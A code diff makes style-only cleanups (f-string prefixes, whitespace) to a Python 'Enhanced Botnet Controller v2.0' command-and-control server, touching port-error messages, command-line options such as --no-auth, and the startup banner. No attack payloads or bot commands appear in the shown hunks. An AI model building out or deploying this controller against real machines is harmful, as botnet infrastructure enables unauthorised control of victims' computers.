@@ -316,22 +316,22 @@ class BotnetController:
             if e.errno == 98 or e.errno == 48:  # Address already in use
                 self.logger.error(f"Port {self.port} is already in use")
                 print(f"\n❌ Error: Port {self.port} is already in use", file=sys.stderr)
-                print(f"Tip: Try a different port with: --port <number>", file=sys.stderr)
-                print(f"     Or find what's using the port:", file=sys.stderr)
+                print("Tip: Try a different port with: --port <number>", file=sys.stderr)
+                print("     Or find what's using the port:", file=sys.stderr)
                 print(f"       Linux/macOS: lsof -i :{self.port}", file=sys.stderr)
                 print(f"       Windows: netstat -ano | findstr :{self.port}", file=sys.stderr)
             elif e.errno == 13:  # Permission denied
                 self.logger.error(f"Permission denied for port {self.port}")
                 print(f"\n❌ Error: Permission denied for port {self.port}", file=sys.stderr)
-                print(f"Tip: Ports below 1024 require root/admin privileges", file=sys.stderr)
-                print(f"     Use a port above 1024 (e.g., 9999) or run as root", file=sys.stderr)
+                print("Tip: Ports below 1024 require root/admin privileges", file=sys.stderr)
+                print("     Use a port above 1024 (e.g., 9999) or run as root", file=sys.stderr)
             else:
                 self.logger.error(f"Failed to start server: {str(e)}")
                 print(f"\n❌ Error: Failed to start server: {str(e)}", file=sys.stderr)
         except Exception as e:
             self.logger.error(f"Failed to start server: {str(e)}")
             print(f"\n❌ Error: Failed to start server: {str(e)}", file=sys.stderr)
-            print(f"Tip: Run with --verbose flag for detailed error information", file=sys.stderr)
+            print("Tip: Run with --verbose flag for detailed error information", file=sys.stderr)
 
     async def _monitor_bots(self) -> None:
         """
@@ -437,85 +437,85 @@ Environment Variables:
   BOTNET_LOG_LEVEL        Logging level (DEBUG, INFO, WARNING, ERROR)
         """
     )
-    
+
     parser.add_argument(
         '--version',
         action='version',
         version='Enhanced Botnet Controller v2.0'
     )
-    
+
     parser.add_argument(
         '--host',
         type=str,
         help='Server bind address (default: from config or env)'
     )
-    
+
     parser.add_argument(
         '--port',
         type=int,
         help='Server port number (default: from config or env)'
     )
-    
+
     parser.add_argument(
         '--config',
         type=str,
         help='Path to configuration file'
     )
-    
+
     parser.add_argument(
         '--no-auth',
         action='store_true',
         help='Skip admin authentication (not recommended for production)'
     )
-    
+
     parser.add_argument(
         '--verbose', '-v',
         action='store_true',
         help='Enable verbose (DEBUG) logging'
     )
-    
+
     parser.add_argument(
         '--quiet', '-q',
         action='store_true',
         help='Minimize logging output (WARNING level only)'
     )
-    
+
     parser.add_argument(
         '--max-connections',
         type=int,
         help='Maximum concurrent connections (default: 100)'
     )
-    
+
     return parser.parse_args()
 
 
 async def main():
     """Main entry point for the botnet controller."""
     import os
-    
+
     args = parse_arguments()
-    
+
     # Override environment variables with command-line arguments
     if args.host:
         os.environ['BOTNET_HOST'] = args.host
-    
+
     if args.port:
         os.environ['BOTNET_PORT'] = str(args.port)
-    
+
     if args.verbose:
         os.environ['BOTNET_LOG_LEVEL'] = 'DEBUG'
     elif args.quiet:
         os.environ['BOTNET_LOG_LEVEL'] = 'WARNING'
-    
+
     if args.max_connections:
         os.environ['BOTNET_MAX_CONNECTIONS'] = str(args.max_connections)
-    
+
     # Skip authentication if requested
     if args.no_auth:
         os.environ['BOTNET_ADMIN_PASSWORD'] = ''
-    
+
     controller = BotnetController(config_file=args.config)
-    
+
     # Display startup information
     print("=" * 60)
     print("Enhanced Botnet Controller v2.0")
@@ -528,7 +528,7 @@ async def main():
     print("=" * 60)
     print("Press Ctrl+C to stop the server")
     print("=" * 60)
-    
+
     await controller.start_server()
 
 
